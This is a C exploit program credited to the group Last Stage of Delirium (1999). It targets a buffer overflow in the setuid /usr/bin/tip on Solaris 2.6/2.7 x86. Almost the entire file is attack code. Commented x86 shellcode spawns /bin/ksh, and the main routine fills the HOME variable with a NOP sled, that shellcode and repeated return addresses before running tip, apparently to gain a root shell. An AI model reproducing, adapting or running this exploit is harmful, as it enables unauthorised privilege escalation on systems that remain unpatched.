/*## copyright LAST STAGE OF DELIRIUM jun 1999 poland        *://lsd-pl.net/ #*/
/*## /usr/bin/tip                                                            #*/

#define ADRNUM 50
#define NOPNUM 173

char shellcode[]=
    "\x33\xc0"                     /* xorl   %eax,%eax             */
    "\xeb\x08"                     /* jmp    <shellcode+12>        */
    "\x5f"                         /* popl   %edi                  */
    "\x47"                         /* incl   %edi                  */
    "\xab"                         /* stosl  %eax,%es:(%edi)       */
    "\x88\x47\x01"                 /* movb   %al,0x1(%edi)         */
    "\xeb\x0d"                     /* jmp    <shellcode+25>        */
    "\xe8\xf3\xff\xff\xff"         /* call   <shellcode+4>         */
    "\x9a\xff\xff\xff\xff\x07\xff" /* lcall                        */
    "\xc3"                         /* ret                          */
    "\x33\xc0"                     /* xorl   %eax,%eax             */ 
    "\x50"                         /* pushl  %eax                  */
    "\xb0\x17"                     /* movb   $0x17,%al             */
    "\xe8\xee\xff\xff\xff"         /* call   <shellcode+17>        */
    "\xeb\x16"                     /* jmp    <shellcode+59>        */
    "\x33\xd2"                     /* xorl   %edx,%edx             */
    "\x58"                         /* popl   %eax                  */
    "\x8d\x78\x14"                 /* leal   0x14(%eax),edi        */
    "\x52"                         /* pushl  %edx                  */
    "\x57"                         /* pushl  %edi                  */
    "\x50"                         /* pushl  %eax                  */
    "\xab"                         /* stosl  %eax,%es:(%edi)       */
    "\x92"                         /* xchgl  %eax,%edx             */
    "\xab"                         /* stosl  %eax,%es:(%edi)       */
    "\x88\x42\x08"                 /* movb   %al,0x7(%edx)         */
    "\xb0\x3b"                     /* movb   $0x3b,%al             */
    "\xe8\xd6\xff\xff\xff"         /* call   <shellcode+17>        */
    "\xe8\xe5\xff\xff\xff"         /* call   <shellcode+37>        */
    "/bin/ksh"
;

char jump[]=
    "\x8b\xc4"                     /* movl   %esp,%eax             */
    "\xc3"                         /* ret                          */
;

main(int argc,char **argv){
    char buffer[10000],adr[4],*b;
    int i;

    printf("copyright LAST STAGE OF DELIRIUM jun 1999 poland  //lsd-pl.net/\n");
    printf("/usr/bin/tip for solaris 2.6 2.7 x86\n\n");

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+10000+100;

    b=buffer;
    sprintf(b,"HOME=");
    b+=5;
    for(i=0;i<NOPNUM;i++) *b++=0x90;
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    putenv(buffer); 
    execl("/usr/bin/tip","tip","dialers",0);
}

